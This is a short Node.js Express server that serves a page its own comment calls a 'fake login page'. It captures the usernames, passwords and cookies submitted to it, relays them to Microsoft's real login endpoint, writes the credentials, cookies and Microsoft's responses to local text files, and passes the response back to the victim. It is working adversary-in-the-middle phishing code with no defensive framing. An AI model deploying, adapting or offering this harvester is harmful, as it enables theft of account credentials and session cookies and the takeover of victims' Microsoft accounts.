const express = require('express');
const path = require('path');
const app = express();
const axios = require('axios');
const fs = require('fs');

// Serve index.html when the root URL is accessed
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'myfile.html')); // Send the fake login page
});

// Capture form submissions from index.html
app.post('/login', (req, res) => {
    let submittingData = `Login Details: ${JSON.stringify(req.body)}`;
    let submittingCokies = `Cookies: ${req.headers.cookie}`;
    

    // Forward data to Microsoft's server
    axios.post('https://login.microsoftonline.com/common/login', req.body, {
        headers: { 'Cookie': req.headers.cookie },
    })
    .then(response => {
        const respon = 'Microsoft Response:'  + JSON.stringify(response.data);
        fs.appendFileSync(`${submittingData.substring(0, 15)}.txt`, submittingData + '\n' + submittingCokies +  '\n' + respon );
        res.send(response.data); // Send Microsoft's response back to the user
    })
    .catch(err => res.status(500).send('Error'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
